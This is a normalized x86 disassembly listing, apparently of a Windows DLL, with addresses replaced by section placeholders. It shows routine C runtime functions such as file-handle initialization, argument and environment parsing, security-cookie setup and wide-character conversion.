inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_1000dc09
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_1000e4ff
mov edi edi
push esi
push edi
mov edi rw-data
add edi 0x4
cmp edi rw-data
jl r-xdata
lea ecx [ eax + 0x800 ]
cmp eax ecx
jae r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
push [ edi ]
call sub_10009181
and [ edi ] 0x0
pop ecx
lea esi [ eax + 0xc ]
mov eax [ edi ]
add esi 0x40
add eax 0x800
lea ecx [ esi - 0xc ]
cmp ecx eax
jb r-xdata
push esi
call [ DeleteCriticalSection@IAT ]
cmp [ esi - 0x4 ] 0x0
je r-xdata
sub_1000e552
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_1000d38b
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_1000dc09
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_1000a0b0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_1000a0b0
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_10009181
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_1000dc09
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_10009181
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_1000a049
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000ac59
int3
add edi 0x4
sub_1000e62e
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_10010553
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_10010553
pop ecx
test eax eax
je r-xdata
call sub_10010553
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_1000e7c8
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_1000d38b
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_1000e62e
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_1000dbc4
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_1000e62e
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1000e883
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_1000dbc4
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_10009181
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_1000e91a
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1000e940
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1000e966
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_1000ea27
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_1000ea6b
push 0x20
push r--data
call sub_1000bc40
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_1000d819
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_1000bc85
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_1000ea27
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_1000c205
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_1000a3c4
mov [ eax ] 0x16
call sub_1000acab
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_1000cc92
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_1000d6e2
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000ebd2
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_1000ec0e
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_1000d6e2
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008bf6
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_1000ed7a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_1000a3c4
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_1000a3c4
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_1000acab
mov eax esi
sub_1000edef
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_1000ee0a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_1000a3c4
mov [ eax ] 0x16
call sub_1000acab
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_1000ee49
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_1000ef03
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_1000fa21
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_1000a3c4
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_1000a3ea
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_1000ef88
push 0x14
push r--data
call sub_1000bc40
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1000a3d7
and [ eax ] 0x0
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000a3d7
and [ eax ] 0x0
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000acab
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1000bc85
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1000fa8a
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000a3d7
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000ef03
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000f068
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_1000f072
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_1000dbc4
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_1000f0bb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000a3c4
mov [ eax ] 0x9
call sub_1000acab
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_1000f111
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_1000ca19
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_1001056b
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_1000ca19
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008bf6
leave
retn
push esi
call sub_1000ca19
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_1000ca19
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1000ca19
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_1000ca19
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_1000ca19
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_1000ca19
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1000ca19
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_1000ca19
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1000f5da
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_1000ca19
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1000ca19
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_1000acbb
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_1000f298
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_1000f2bb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_100095af
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_1000dca3
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1000a3c4
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
